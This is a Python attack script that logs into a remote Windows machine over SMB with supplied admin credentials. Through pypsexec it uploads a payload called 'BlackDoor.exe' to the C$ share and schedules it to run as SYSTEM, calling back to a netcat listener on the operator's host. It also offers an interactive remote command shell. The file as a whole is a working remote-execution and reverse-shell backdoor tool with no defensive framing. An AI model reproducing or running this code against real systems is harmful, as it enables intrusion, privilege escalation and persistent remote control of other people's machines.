from pypsexec.client import Client
import argparse
import smbclient
import subprocess
import datetime
import argparse
import socket
import threading
import random

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        local_ip = s.getsockname()[0]
    except Exception:
        local_ip = '127.0.0.1'
    finally:
        s.close()
    return local_ip

def system_priv(ip=None,username=None,password=None, smb_share_path='C$', executable='BlackDoor.exe', port=455):
    task_name = "MyTask"
    start_time = (datetime.datetime.now() + datetime.timedelta(seconds=60)).strftime("%H:%M:%S")

    try:
        # Set the login credentials for the SMB server
        smbclient.ClientConfig(username=username, password=password, port=args.port)
        print("[+] SMB connected successfully.")
        # Local file path and remote destination path
        local_file_path = 'BlackDoor.exe'
        remote_file_path = f'\\\\{ip}\\{smb_share_path}\\{executable}'

        print(f"[*] Uploading payload to SMB share...")

        # Upload the local file to the SMB share
        with open(local_file_path, 'rb') as local_file:
            with smbclient.open_file(remote_file_path, mode='wb') as remote_file:
                remote_file.write(local_file.read())
        
        print(f"[+] Payload uploaded to SMB share successfully")
    except Exception as e:
        print(f"[-] Error during SMB operations: {str(e)}")
        return

    try:
        IPAddr= get_local_ip()  
    except Exception as e:
        print(f"[-] Error getting IP address: {str(e)}")
        return

    
    ranPort = random.randint(1024, 65535)
    try:
        
        # Create the command to schedule the task
        command = f'schtasks /Create /RU SYSTEM /SC ONCE /TN {task_name} /TR "C:\\{executable} {IPAddr} {ranPort}" /ST {start_time} /F'

        commandRun = f'schtasks /Run /TN {task_name}'

        # Execute the command
        
        print(f"[*] Connecting to listener...")
        executeCommand(command)
        executeCommand(commandRun)
        c.remove_service()
        c.disconnect()
        listener_thread = threading.Thread(target=netcat_thread(ranPort))
        listener_thread.start()
        print(f"[+] Connected.")
    except Exception as e:
        print(f"[-] Error during task creation or execution: {str(e)}")

def executeCommand(command, out=False):
            stdout, stderr = c.run_executable("cmd.exe", arguments="/c " + command)[:2]
            if out:
                print(stdout.decode())
                print(stderr.decode())

def netcat_thread(port):
    try:
        subprocess.run(['nc', '-nlvp', str(port)])
        print("[+] Listening on port: " + str(port))
    except Exception as e:
        print(f"[-] Error when starting thread for netcat: {str(e)}")



if __name__ == "__main__":
    # create an argument parser
    parser = argparse.ArgumentParser(description="Connect to clients.")
    parser.add_argument("-system", "--system", action="store_true", help="NT authority\system Account.")
    parser.add_argument("-u", "--username", required=True, help="Admin username.", type=str)
    parser.add_argument("-p", "--password", required=True, help="Admin password.", type=str)
    parser.add_argument("-ip", "--ip_addr", required=True, help="IP address of remote machine.")
    parser.add_argument("-port", "--port", help="Port of SMB.", type=int ,default=445)
    parser.add_argument("-smbpath", "--smb_share_path", help="Path for SMB share.", type=str, default='C$')
    parser.add_argument("-exe", "--executable", help="Path for executable file.", type=str, default='BlackDoor.exe')
    args = parser.parse_args()

    # create a pypsexec client
    c = Client(args.ip_addr, username=args.username, password=args.password, port=args.port,
               encrypt=False) 
    flag_value = args.system

    try:
        print("[*] Trying to connect to client")
        # connect to the client
        c.connect()
        print("[+] Connected")
        # create the service
        c.create_service()
        print("[+] Service Created")
        if flag_value:
            try:
                system_priv(ip=args.ip_addr, username=args.username,password=args.password, smb_share_path=args.smb_share_path, executable=args.executable, port=args.port)
            except Exception as e:
                print(f"[-] Error in main: {str(e)}")

        while True:
            command = input("")

            if command.lower() == 'exit':
                break

            # run the command and get the output
            executeCommand(command, True)

    except Exception as e:
        print(f"An error occurred: {str(e)}")
    finally:
        try:
            # clean up and close the connection
            c.remove_service()
            c.disconnect()
        except Exception as e:
            print(f"An error occurred during cleanup: {str(e)}")
